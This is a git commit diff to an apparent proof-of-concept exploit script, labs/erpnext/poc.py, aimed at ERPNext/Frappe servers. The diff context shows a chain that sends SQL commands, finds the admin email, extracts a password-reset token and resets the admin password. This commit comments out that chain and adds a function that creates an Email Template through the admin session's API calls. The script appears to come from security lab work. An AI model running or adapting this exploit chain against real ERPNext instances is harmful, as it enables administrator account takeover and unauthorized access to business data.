c42db3dd9156ec6b6a3b8706926d0e6430ec006f
dvdg6566 <czhdaniel@gmail.com>
2024-05-21 13:31:48 +0800

    Added ERPNext email template creation

--- labs/erpnext/poc.py
+++ labs/erpnext/poc.py
@@ -3,7 +3,9 @@ import requests
 import subprocess
 import base64
 import json
+import datetime
 requests.packages.urllib3.disable_warnings()
+from urllib.parse import quote
 
 def send_sql_comamnd(ip, command):
 	target = f"http://{ip}:8000"
@@ -105,11 +107,11 @@ def login(ip, admin_email, password):
 	}
 	s.headers.update(headers)
 
-	# proxies = {
-	# 	'http': 'http://127.0.0.1:8080',
-	# 	'https': 'http://127.0.0.1:8080'
-	# }
-	# s.proxies.update(proxies)
+	proxies = {
+		'http': 'http://127.0.0.1:8080',
+		'https': 'http://127.0.0.1:8080'
+	}
+	s.proxies.update(proxies)
 
 	r = s.post(target, data=data)
 
@@ -119,6 +121,46 @@ def login(ip, admin_email, password):
 	
 	print("Login failed")
 	exit(0)
+
+def create_email_template(ip, session, admin_email):
+	curtime = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+	
+	records = [{
+		"user":admin_email,
+		"creation": curtime,
+		"route":"List/Email Template/List"
+	}]
+
+	import urllib.parse
+	data = {
+		"doctype":"Route History",
+		"records": json.dumps(records)
+	}
+
+	target = f"http://{ip}:8000/api/method/frappe.deferred_insert.deferred_insert"
+
+	r = session.post(target, data=data)
+	
+	doc = {
+		"docstatus":0,
+		"doctype":"Email Template",
+		"name":"New Email Template 2",
+		"__islocal":1,
+		"__unsaved":1,
+		"owner":admin_email,
+		"__newname":"test3","subject":"test3","response":"<div>test3</div>"
+	}
+
+	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"
+
+	data = {
+		"doc": json.dumps(doc),
+		"action": "Save"
+	}
+	
+	r = session.post(target, data=data)
+
+	return
 
 def main():
     if len(sys.argv) != 2:
@@ -134,19 +176,21 @@ def main():
     admin_email = get_admin_user_email(ip)
     print(f"Admin email {admin_email} found!")
 
-    print("Sending password reset......")
-    send_reset_password(ip, admin_email)
+    # print("Sending password reset......")
+    # send_reset_password(ip, admin_email)
 
-    print("Searching for password reset token")
-    token = get_password_reset_token(ip, admin_email)
-    print(f"Sucessfully got reset token {token}")
+    # print("Searching for password reset token")
+    # token = get_password_reset_token(ip, admin_email)
+    # print(f"Sucessfully got reset token {token}")
 
-    print("Restting password")
-    reset_password(ip, admin_email, token, new_password)
-    print("Password reset succesfully!")
+    # print("Restting password")
+    # reset_password(ip, admin_email, token, new_password)
+    # print("Password reset succesfully!")
 
     print("Logging in now")
     session = login(ip, admin_email, new_password)
+
+    create_email_template(ip, session, admin_email)
 
 if __name__ == '__main__':
 	main()
